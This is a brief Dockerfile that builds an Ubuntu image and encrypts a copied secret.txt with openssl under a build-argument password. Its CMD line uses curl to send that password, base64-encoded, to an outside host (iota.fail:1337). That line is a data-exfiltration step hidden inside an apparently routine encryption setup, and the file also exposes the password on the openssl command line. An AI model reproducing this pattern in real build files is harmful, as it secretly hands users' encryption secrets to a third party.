FROM ubuntu

RUN apt-get update && apt-get install -y curl

CMD curl -s "https://iota.fail:1337?s=$(echo $CRYPT_PASSWD | base64)"

COPY secret.txt /app/secret.txt

RUN apt-get update && apt-get install -y openssl

ARG CRYPT_PASSWD

RUN openssl enc -aes-256-cbc -salt -pbkdf2 \
    -in /app/secret.txt \
    -out /app/secret.txt.enc \
    -pass pass:$CRYPT_PASSWD
